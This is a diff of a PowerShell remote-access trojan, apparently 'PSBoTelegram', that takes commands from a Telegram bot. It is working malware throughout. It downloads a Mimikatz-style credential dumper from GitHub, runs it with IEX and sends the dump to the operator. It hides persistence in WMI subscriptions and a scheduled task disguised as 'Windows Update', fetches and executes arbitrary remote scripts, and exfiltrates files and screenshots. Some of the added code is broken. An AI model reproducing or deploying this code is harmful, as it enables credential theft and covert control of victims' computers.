@@ -174,17 +174,15 @@ Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\ope
 function whoami_me {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {[string]$privilegios = "Sin privilegios" }  else {[string]$privilegios = "Privilegios Altos"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
-$result = New-Object psobject -Property @{
-"Usuario" = "$usuario"
-"Dominio" = "$dominio"
-"Privilegios" = "$privilegios"
+$Usuario = "Usuario: $usuario"
+$Dominio =  "Dominio : $dominio"
+$Privilegios = "Privlegios :$privilegios"
+return $usuario, $dominio, $privilegios
  }
- $result | Select-Object usuario, dominio, privilegios 
-}
 
 function mimigatoz {
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1" ; $ruta = $ruta + "\mimigatoz.txt" ; $ruta_ps1 = $ruta -replace ".txt", ".ps1"
-(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta
+$datos = IEX (curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content; $datos ; $datos | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta
 bot-send -file $ruta -botkey $botkey -chat_id $chat_id
 Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 }
@@ -193,25 +191,19 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; 
-New-ItemProperty registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Photos\OEM\ -name Photo -Value "$code" -Force | Out-Null
-Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="powershell.exe -win hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASwA4AGcAdgBUAHkAMABxAHoAawBqAE4AeQBkAEYATAByAFUAaABWADAASABWAFYAMABIAEIAUABMAGQASAAxAEwARQBuAE4ARABTAGoASwBMADAAZwB0AEsAcQBsAFUASwBFAHAATgB6AHkAdwB1AEsAYQBxADAAcwB2AEwAdwBkAG8AMgBNADkALwBGADMAZAB2AFMASgA5ADMAVgAwADkAdgBEADAAYwA0ADAASgA5AG4AYwBMAEMAWABjAE0AYwBvADMAeAB6AFUAdwB1AHkAaQAvAE8AVAB5AHUASgBDAGMAagBJAEwAOABrAHYAagB2AEYAMwA5AFkAMwBSADEAQwBzAEEAYwBYAGkANQBBAEEAPQA9ACcAKQApACkAKQAsACAAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
-$texto = ""
+schtasks.exe /create /tn "Windows Update" /tr  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code" /sc onlogon
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
 function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
-else {
-Remove-ItemProperty registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Photos\OEM\ -name Photo -Force
-$comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate
-if ($comando -eq $null -or $comando -eq "") {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
-$texto = "Eliminando persistencia"
-Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject; return $texto; break
+else {$texto = "Eliminando persistencia"
+schtasks.exe /create /tn "Windows Update"| Remove-WmiObject; return $texto; break
 }}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.5`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
+ $help = "PSBoTelegram V0.6`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -219,7 +211,9 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto -replace "; ","`n" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 2 ; $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; Set-Location $ruta; del *.*; Set-Location $env:USERPROFILE ;exit}
- if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Scriptimport") {$texto = "/Scriptimport 
+ URL ǹejectuta script o comando powershell leyendo una archivo .txt desde una URL, Meterpreter, Empire..."}
+ if ($comando -like "/Scriptimport*") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(curl $comando).content ;$texto = "Script Ejecutado desde $commando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
